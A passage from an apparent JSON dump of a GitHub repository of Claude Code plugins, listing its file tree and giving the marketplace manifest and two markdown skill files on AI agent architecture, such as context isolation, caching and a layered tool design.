        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/advanced.md",
          "type": "blob",
          "size": 24341
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/command-hooks.md",
          "type": "blob",
          "size": 1032
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/configuration.md",
          "type": "blob",
          "size": 1198
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/env-vars.md",
          "type": "blob",
          "size": 6377
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/events.md",
          "type": "blob",
          "size": 5647
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/examples.md",
          "type": "blob",
          "size": 12543
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/exit-codes.md",
          "type": "blob",
          "size": 5630
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/io-formats.md",
          "type": "blob",
          "size": 1475
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/matchers.md",
          "type": "blob",
          "size": 7530
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/migration.md",
          "type": "blob",
          "size": 18977
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/patterns.md",
          "type": "blob",
          "size": 23844
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/performance.md",
          "type": "blob",
          "size": 2913
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/prompt-hooks.md",
          "type": "blob",
          "size": 7335
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/schema.md",
          "type": "blob",
          "size": 5643
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/security.md",
          "type": "blob",
          "size": 1850
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/testing.md",
          "type": "blob",
          "size": 6306
        },
        {
          "path": "plugins/sys-core/skills/managing-hooks/references/troubleshooting.md",
          "type": "blob",
          "size": 3928
        },
        {
          "path": "plugins/sys-core/skills/repairing-state",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/repairing-state/SKILL.md",
          "type": "blob",
          "size": 2760
        },
        {
          "path": "plugins/sys-core/skills/repairing-state/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-core/skills/repairing-state/references/bootstrap-protocol.md",
          "type": "blob",
          "size": 1472
        },
        {
          "path": "plugins/sys-core/skills/repairing-state/references/diagnosis-patterns.md",
          "type": "blob",
          "size": 1769
        },
        {
          "path": "plugins/sys-edge",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 386
        },
        {
          "path": "plugins/sys-edge/README.md",
          "type": "blob",
          "size": 3394
        },
        {
          "path": "plugins/sys-edge/commands",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/commands/migrate-python.md",
          "type": "blob",
          "size": 736
        },
        {
          "path": "plugins/sys-edge/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/experimenting-edge",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/experimenting-edge/SKILL.md",
          "type": "blob",
          "size": 8923
        },
        {
          "path": "plugins/sys-edge/skills/experimenting-edge/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/experimenting-edge/assets/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/experimenting-edge/assets/templates/standard-skill.md",
          "type": "blob",
          "size": 434
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/SKILL.md",
          "type": "blob",
          "size": 5058
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/assets/templates",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/assets/templates/progressive-disclosure.md",
          "type": "blob",
          "size": 2035
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references/conflict-resolution.md",
          "type": "blob",
          "size": 4867
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references/encryption.md",
          "type": "blob",
          "size": 4396
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references/incremental-sync.md",
          "type": "blob",
          "size": 5677
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references/privacy-first.md",
          "type": "blob",
          "size": 5671
        },
        {
          "path": "plugins/sys-edge/skills/synchronizing-data/references/sync-states.md",
          "type": "blob",
          "size": 6010
        },
        {
          "path": "plugins/sys-multimodal",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 401
        },
        {
          "path": "plugins/sys-multimodal/README.md",
          "type": "blob",
          "size": 5132
        },
        {
          "path": "plugins/sys-multimodal/agents",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/agents/video-editor.md",
          "type": "blob",
          "size": 316
        },
        {
          "path": "plugins/sys-multimodal/hooks",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/hooks/hooks.json",
          "type": "blob",
          "size": 437
        },
        {
          "path": "plugins/sys-multimodal/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui/SKILL.md",
          "type": "blob",
          "size": 5224
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui/references/composition-patterns.md",
          "type": "blob",
          "size": 2363
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui/references/philosophy-examples.md",
          "type": "blob",
          "size": 3053
        },
        {
          "path": "plugins/sys-multimodal/skills/generating-ui/references/visual-principles.md",
          "type": "blob",
          "size": 3048
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/SKILL.md",
          "type": "blob",
          "size": 1585
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/audio-processing.md",
          "type": "blob",
          "size": 7909
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/edl-generation.md",
          "type": "blob",
          "size": 9913
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/ffmpeg-recipes.md",
          "type": "blob",
          "size": 57
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/frame-analysis.md",
          "type": "blob",
          "size": 8370
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/narrative-flow.md",
          "type": "blob",
          "size": 11583
        },
        {
          "path": "plugins/sys-multimodal/skills/processing-media/references/scene-detection.md",
          "type": "blob",
          "size": 8489
        },
        {
          "path": "plugins/sys-nodejs",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 440
        },
        {
          "path": "plugins/sys-nodejs/README.md",
          "type": "blob",
          "size": 598
        },
        {
          "path": "plugins/sys-nodejs/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/SKILL.md",
          "type": "blob",
          "size": 3334
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/modern-features.md",
          "type": "blob",
          "size": 6043
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/performance-playbook.md",
          "type": "blob",
          "size": 2115
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/practical-patterns.md",
          "type": "blob",
          "size": 3844
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/tests-configs.md",
          "type": "blob",
          "size": 6311
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/type-level-toolbox.md",
          "type": "blob",
          "size": 2921
        },
        {
          "path": "plugins/sys-nodejs/skills/configuring-typescript/references/type-testing.md",
          "type": "blob",
          "size": 1591
        },
        {
          "path": "plugins/sys-nodejs/skills/managing-npm",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-nodejs/skills/managing-npm/SKILL.md",
          "type": "blob",
          "size": 1795
        },
        {
          "path": "plugins/sys-research",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/.claude-plugin",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/.claude-plugin/plugin.json",
          "type": "blob",
          "size": 427
        },
        {
          "path": "plugins/sys-research/README.md",
          "type": "blob",
          "size": 439
        },
        {
          "path": "plugins/sys-research/skills",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/SKILL.md",
          "type": "blob",
          "size": 3389
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/analysis-examples.md",
          "type": "blob",
          "size": 4971
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/assumptions_and_diagnostics.md",
          "type": "blob",
          "size": 11417
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/bayesian_statistics.md",
          "type": "blob",
          "size": 17534
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/effect_sizes_and_power.md",
          "type": "blob",
          "size": 14990
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/report-templates.md",
          "type": "blob",
          "size": 1984
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/reporting_standards.md",
          "type": "blob",
          "size": 19504
        },
        {
          "path": "plugins/sys-research/skills/analyzing-data/references/test_selection_guide.md",
          "type": "blob",
          "size": 5335
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/SKILL.md",
          "type": "blob",
          "size": 2243
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/assets",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/assets/timing_guidelines.md",
          "type": "blob",
          "size": 14723
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/beamer_guide.md",
          "type": "blob",
          "size": 19329
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/beamer_workflow.md",
          "type": "blob",
          "size": 7610
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/data_visualization_slides.md",
          "type": "blob",
          "size": 17877
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/frameworks.md",
          "type": "blob",
          "size": 2881
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/pdf_workflow.md",
          "type": "blob",
          "size": 7297
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/presentation_structure.md",
          "type": "blob",
          "size": 22226
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/slide_design_principles.md",
          "type": "blob",
          "size": 23729
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/talk_types_guide.md",
          "type": "blob",
          "size": 20232
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/templates.md",
          "type": "blob",
          "size": 6399
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/visual_review_workflow.md",
          "type": "blob",
          "size": 20131
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/visualization.md",
          "type": "blob",
          "size": 3372
        },
        {
          "path": "plugins/sys-research/skills/architecting-slides/references/writing.md",
          "type": "blob",
          "size": 7714
        },
        {
          "path": "plugins/sys-research/skills/conducting-research",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/conducting-research/SKILL.md",
          "type": "blob",
          "size": 6247
        },
        {
          "path": "plugins/sys-research/skills/conducting-research/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/conducting-research/references/research-protocol.md",
          "type": "blob",
          "size": 1400
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/SKILL.md",
          "type": "blob",
          "size": 3636
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references",
          "type": "tree",
          "size": null
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references/api-reference.md",
          "type": "blob",
          "size": 11286
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references/best-practices.md",
          "type": "blob",
          "size": 705
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references/integration-examples.md",
          "type": "blob",
          "size": 6621
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references/integration-patterns.md",
          "type": "blob",
          "size": 38388
        },
        {
          "path": "plugins/sys-research/skills/ingesting-git/references/quick-start.md",
          "type": "blob",
          "size": 10556
        }
      ],
      "files": {
        ".claude-plugin/marketplace.json": "{\n  \"name\": \"cattoolkit\",\n  \"metadata\": {\n    \"description\": \"Official plugin marketplace for The Cat Toolkit - A layered orchestration framework for autonomous AI development with vibecoding principles.\",\n    \"version\": \"1.3.0\",\n    \"keywords\": [\n      \"vibecoding\",\n      \"ai-development\",\n      \"plugins\",\n      \"automation\",\n      \"orchestration\",\n      \"agents\",\n      \"skills\",\n      \"framework\"\n    ],\n    \"homepage\": \"https://github.com/Git-Fg/thecattoolkit\",\n    \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n    \"license\": \"MIT\"\n  },\n  \"owner\": {\n    \"name\": \"Git-Fg\"\n  },\n  \"plugins\": [\n    {\n      \"name\": \"sys-core\",\n      \"source\": \"./plugins/sys-core\",\n      \"description\": \"INFRASTRUCTURE & SYSTEM DOMAIN - Foundation tools for system stability, security auditing, plugin management, validation, hooks, MCP integration, and development infrastructure\",\n      \"version\": \"1.0.4\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Infrastructure\",\n      \"tags\": [\n        \"security\",\n        \"infrastructure\",\n        \"validation\",\n        \"hooks\"\n      ],\n      \"keywords\": [\n        \"security\",\n        \"audit\",\n        \"validation\",\n        \"toolkit\",\n        \"infrastructure\",\n        \"safety\",\n        \"hooks\",\n        \"scaffolding\",\n        \"mcp\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-builder\",\n      \"source\": \"./plugins/sys-builder\",\n      \"description\": \"DEVELOPMENT & ENGINEERING DOMAIN - Software development, architecture design, planning, execution, testing, and project implementation\",\n      \"version\": \"1.0.1\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Development\",\n      \"tags\": [\n        \"development\",\n        \"architecture\",\n        \"engineering\",\n        \"software\"\n      ],\n      \"keywords\": [\n        \"execution\",\n        \"architecture\",\n        \"implementation\",\n        \"planning\",\n        \"tdd\",\n        \"software-engineering\",\n        \"builder\",\n        \"testing\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-cognition\",\n      \"source\": \"./plugins/sys-cognition\",\n      \"description\": \"AI/ML & COGNITIVE DOMAIN - Context engineering, memory systems, reasoning, prompt engineering, and agent orchestration\",\n      \"version\": \"1.0.3\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"AI/ML\",\n      \"tags\": [\n        \"cognition\",\n        \"reasoning\",\n        \"prompt-engineering\",\n        \"thinking\"\n      ],\n      \"keywords\": [\n        \"thinking\",\n        \"prompt-engineering\",\n        \"analysis\",\n        \"frameworks\",\n        \"reasoning\",\n        \"deep-analysis\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-agents\",\n      \"source\": \"./plugins/sys-agents\",\n      \"description\": \"Agent & LLM development patterns, orchestration, context management, and memory systems for building effective AI agents.\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"AI/ML\",\n      \"tags\": [\n        \"agents\",\n        \"orchestration\",\n        \"context-engineering\",\n        \"memory\"\n      ],\n      \"keywords\": [\n        \"agent-design\",\n        \"context-engineering\",\n        \"memory-systems\",\n        \"orchestration\",\n        \"multi-agent\",\n        \"sub-agents\",\n        \"rag\",\n        \"hybrid-search\",\n        \"vector-databases\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-research\",\n      \"source\": \"./plugins/sys-research\",\n      \"description\": \"RESEARCH & KNOWLEDGE DOMAIN - Research tools, knowledge retrieval, codebase analysis, gitingest, and experimental analysis\",\n      \"version\": \"1.0.3\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Research\",\n      \"tags\": [\n        \"research\",\n        \"analysis\",\n        \"knowledge\",\n        \"documentation\"\n      ],\n      \"keywords\": [\n        \"research\",\n        \"knowledge-retrieval\",\n        \"analysis\",\n        \"experimental\",\n        \"documentation\",\n        \"gitingest\",\n        \"codebase-analysis\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-edge\",\n      \"source\": \"./plugins/sys-edge\",\n      \"description\": \"EDGE & TOOLING DOMAIN - Edge AI, mobile optimization, offline-first systems, Python tooling, and resource-constrained environments\",\n      \"version\": \"1.0.2\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Tools\",\n      \"tags\": [\n        \"edge\",\n        \"mobile\",\n        \"optimization\",\n        \"python\"\n      ],\n      \"keywords\": [\n        \"edge\",\n        \"mobile\",\n        \"optimization\",\n        \"offline-sync\",\n        \"battery\",\n        \"quantization\",\n        \"uv\",\n        \"ruff\",\n        \"python-tools\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-multimodal\",\n      \"source\": \"./plugins/sys-multimodal\",\n      \"description\": \"MEDIA & MULTIMODAL DOMAIN - Advanced tools for video editing, media processing, multimodal AI, visual content creation, and data visualization\",\n      \"version\": \"1.0.1\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Media\",\n      \"tags\": [\n        \"multimodal\",\n        \"video\",\n        \"media\",\n        \"visualization\"\n      ],\n      \"keywords\": [\n        \"multimodal\",\n        \"video-editing\",\n        \"media-processing\",\n        \"vision\",\n        \"audio\",\n        \"scene-detection\",\n        \"intent-translation\",\n        \"data-visualization\",\n        \"storytelling\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-nodejs\",\n      \"source\": \"./plugins/sys-nodejs\",\n      \"description\": \"NODE.JS/TS RUNTIME DOMAIN - Language-specific tooling for Node.js, TypeScript, Bun, and npm/pnpm/bun package ecosystems\",\n      \"version\": \"1.0.0\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"MIT\",\n      \"category\": \"Development\",\n      \"tags\": [\n        \"nodejs\",\n        \"typescript\",\n        \"javascript\",\n        \"bun\",\n        \"npm\"\n      ],\n      \"keywords\": [\n        \"nodejs\",\n        \"typescript\",\n        \"javascript\",\n        \"bun\",\n        \"npm\",\n        \"pnpm\",\n        \"runtime\",\n        \"package-manager\"\n      ],\n      \"strict\": true\n    },\n    {\n      \"name\": \"sys-browser\",\n      \"source\": \"./plugins/sys-browser\",\n      \"description\": \"The complete web interaction suite. Features a unified 'browser-automation' skill that intelligently orchestrates between lightweight high-speed crawling (@just-every/crawl) and complex structure-based automation (Playwright MCP).\",\n      \"version\": \"2.0.0\",\n      \"author\": {\n        \"name\": \"Git-Fg\"\n      },\n      \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n      \"license\": \"Apache-2.0\",\n      \"category\": \"Testing\",\n      \"tags\": [\n        \"automation\",\n        \"testing\",\n        \"browser\",\n        \"playwright\"\n      ],\n      \"keywords\": [\n        \"browser-automation\",\n        \"testing\",\n        \"playwright\",\n        \"qa\",\n        \"crawling\",\n        \"scraping\"\n      ],\n      \"strict\": true\n    }\n  ]\n}",
        "plugins/sys-agents/.claude-plugin/plugin.json": "{\n  \"name\": \"sys-agents\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Agent & LLM development patterns, orchestration, context management, and memory systems for building effective AI agents.\",\n  \"author\": {\n    \"name\": \"Git-Fg\"\n  },\n  \"repository\": \"https://github.com/Git-Fg/thecattoolkit\",\n  \"license\": \"MIT\"\n}\n",
        "plugins/sys-agents/skills/architecting-agents/SKILL.md": "---\nname: architecting-agents\ndescription: \"Provides industry-proven design patterns for effective AI agents based on production systems like Claude Code, Manus, and Cursor. Use when designing agent architectures, optimizing context management, or implementing sub-agent patterns.\"\nuser-invocable: true\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash]\n---\n\n# Architecting Agents Protocol\n\n# Architecting Agents Protocol\n\nProvides design patterns for agent context management.\n\n## Cost Warning (CRITICAL)\n\nBefore using sub-agents, understand the costs:\n\n| Approach | When to Use |\n|:---------|:------------|\n| **Inline** | Most tasks |\n| **Fork** | Isolation needed |\n| **Subagent** | Parallelization only (High Cost) |\n\n**Default Recommendation:** Use `context: fork` in skills for isolation. Subagents are ONLY appropriate when parallelization benefit clearly exceeds 20K token startup cost AND quota overhead.\n\nSee [references/subagent-risks.md](references/subagent-risks.md) for detailed evidence.\n\n---\n\n\n\n## Pattern Index\n\n| Pattern | Purpose | When to Use |\n|:--------|:--------|:------------|\n| [Computer Access](#1-computer-access) | Persistent context via filesystem | Agent needs state persistence |\n| [Multi-Layer Actions](#2-multi-layer-action-space) | Hierarchical tool design | Reducing tool definition overhead |\n| [Progressive Disclosure](#3-progressive-disclosure) | Reveal actions on demand | Managing large action spaces |\n| [Context Offloading](#4-context-offloading) | Filesystem storage for context | Context window pressure |\n| [Context Caching](#5-context-caching) | Prompt caching strategies | Cost/latency optimization |\n| [Context Isolation](#6-context-isolation) | Sub-agent separation | Long-running or parallel tasks |\n| [Context Evolution](#7-context-evolution) | Continual learning | Building agent memories |\n\n---\n\n## 1. Computer Access\n\n**Components:**\n- **Filesystem**: Persistent context storage, state across sessions\n- **Shell**: Execute utilities, CLIs, scripts, or generated code\n\n**Implementation:**\n```\nAgent  Bash Tool  Shell Utilities / CLIs / Scripts\nAgent  File Tools  Read / Write / Edit filesystem\n```\n\n---\n\n## 2. Multi-Layer Action Space\n\n\n\n**Action Hierarchy:**\n```\nLevel 1: Tool Calling (agent-visible)\n  \nLevel 2: Shell Utilities / CLIs (computer-level)\n  \nLevel 3: Code Execution (generated scripts)\n```\n\n\n\n---\n\n## 3. Progressive Disclosure\n\n\n\n**Strategies:**\n\n| Layer | Approach |\n|:------|:---------|\n| Tool Calling | Index definitions, retrieve on demand |\n| Shell Utilities | List available utilities in instructions; use `--help` when needed |\n| MCP Servers | Sync descriptions to folder; read full spec only if task requires |\n| Skills | YAML frontmatter indexed; full SKILL.md read on demand |\n\n**Implementation Pattern:**\n```\n1. Provide short list of available capabilities\n2. Agent reads detailed spec only when task matches\n3. Execute with full knowledge loaded just-in-time\n```\n\n---\n\n## 4. Context Offloading\n\n**Approaches:**\n- Write old tool results to files\n- Store agent trajectories for later retrieval\n- Apply summarization only after offloading diminishing returns\n\n**Plan File Pattern:**\nWrite plan to file  Read periodically to reinforce objectives  Verify work against plan\n\n---\n\n## 5. Context Caching\n\n\n\n**Caching Requirements:**\n- Stable prefix (system prompt unchanged)\n- Append-only message history\n- Deterministic serialization (sorted JSON keys)\n\n**Anti-Pattern:** Mutating history in ways that break cache prefix\n\n---\n\n## 6. Context Isolation\n\n\n\n**Default Approach: Use `context: fork`**\n\n```yaml\n---\nname: processing-batch\ndescription: \"Processes multiple files in isolated context\"\ncontext: fork\nallowed-tools: [Read, Write, Bash]\n---\n```\n\n**Cost:** ~3x inline, but FREE as tool call within prompt quota.\n**Use for:** Heavy operations (>10 files), parallel processing, isolation needs.\n\n**Subagent Alternatives (Use Sparingly)**\n\nONLY when parallelization benefit > 20K token startup cost:\n\n| Scenario | Pattern | Recommendation |\n|:---------|:--------|:---------------|\n| Parallelizable tasks | Map-reduce | Use fork unless >50 parallel units |\n| Long-running tasks | Ralph Loop | Use fork with persistent files |\n| Independent checks | Parallel reviewers | Use fork for cost efficiency |\n\n**The Ralph Loop:**\n```\n1. Initializer sets up environment (plan file, tracking file)\n2. Sub-agents tackle individual tasks from plan\n3. Progress communicated via git history\n4. Stop hooks verify work after each iteration\n5. Repeat until plan satisfied\n```\n\n**Benefits:**\n- Prevents single-agent context saturation\n- Enables parallel execution\n- Clear isolation boundaries\n\n---\n\n## 7. Context Evolution\n\n**Evolution Patterns:**\n\n| Type | Approach |\n|:-----|:---------|\n| Task-specific prompts | Collect trajectories  Score  Reflect on failures  Propose variants |\n| Memory learning | Distill sessions into diary entries  Reflect  Update instructions |\n| Skill learning | Reflect over trajectories  Distill reusable procedures  Save as new skills |\n\n**Implementation:**\n```\nSession Log  Reflection  Memory/Skill Update  Context\n```\n\n---\n\n\n\n## Quick Reference\n\n**For detailed implementations, see:**\n- [references/computer-access.md](references/computer-access.md) - Filesystem/shell patterns\n- [references/action-hierarchy.md](references/action-hierarchy.md) - Multi-layer tool design\n- [references/progressive-disclosure.md](references/progressive-disclosure.md) - Just-in-time context loading\n- [references/context-patterns.md](references/context-patterns.md) - Offload, cache, isolate, evolve\n\n**Related Skills:**\n- `agent-orchestration` - Multi-agent patterns (Orchestrator, Swarm, Hierarchical)\n- `context-engineering` - Compression, degradation, KV-cache optimization\n- `memory-systems` - Long-term memory architectures\n",
        "plugins/sys-agents/skills/architecting-agents/references/action-hierarchy.md": "# Multi-Layer Action Space\n\nAgents use a small set of atomic tools to perform a wide range of actions by pushing complexity to the computer layer.\n\n## The Problem\n\nTool definitions consume context:\n- Each tool has schema + description\n- MCP servers can add tens of thousands of tokens\n- Overlapping tools confuse models\n\n## The Solution: Action Hierarchy\n\n```\n\n Level 1: Tool Calling                 \n (Agent-visible, ~12-20 tools)         \n - Bash, Read, Write, Edit, Grep, Glob \n\n                   \n                   \n\n Level 2: Shell Utilities / CLIs       \n (Computer-level, unlimited)           \n - git, npm, docker, jq, ripgrep, ...  \n\n                   \n                   \n\n Level 3: Code Execution               \n (Dynamic, generated by agent)         \n - Python scripts, shell scripts       \n\n```\n\n## Production Examples\n\n| Agent | Tool Count | How Broader Actions Work |\n|:------|:-----------|:-------------------------|\n| Claude Code | ~12 | Bash tool executes CLIs and scripts |\n| Manus | <20 | Bash tool on virtual computer |\n| Amp Code | ~10 | Curated action space + code execution |\n\n## Benefits\n\n### Token Savings\n- Fewer tool definitions in context\n- Intermediate results stay on computer (not in context)\n- Agent processes only final output\n\n### Flexibility\n- Shell provides unlimited capabilities\n- Agent writes code for novel operations\n- No need to predict all possible actions\n\n### Composability\n- Chain actions via code\n- CodeAct pattern: write script, execute, parse result\n- Complex workflows without tool proliferation\n\n## Implementation Guidelines\n\n### Core Tools (Level 1)\n\nEvery agent should have:\n- **Bash**: Execute commands\n- **Read**: Read files\n- **Write**: Create files\n- **Edit**: Modify files\n- **Search**: Find files/content (Glob, Grep)\n\nOptional:\n- **Web**: Fetch URLs\n- **Task**: Spawn sub-agents\n\n### Exposing Level 2 Capabilities\n\nIn agent instructions:\n```\nAvailable shell utilities: git, npm, docker, jq, ripgrep, fd\nUse --help to learn about any utility.\n```\n\nAgent discovers usage on demand via `--help` or documentation.\n\n### Level 3: Code Execution\n\nAgent writes and executes code for:\n- Complex data transformations\n- Multi-step operations\n- Operations without existing CLI\n- Custom logic\n\n## Anti-Patterns\n\n| Anti-Pattern | Problem |\n|:-------------|:--------|\n| Tool for every action | Context bloat |\n| Passing all output to context | Token waste |\n| Hiding shell access | Limits flexibility |\n| No code execution | Can't handle novel tasks |\n",
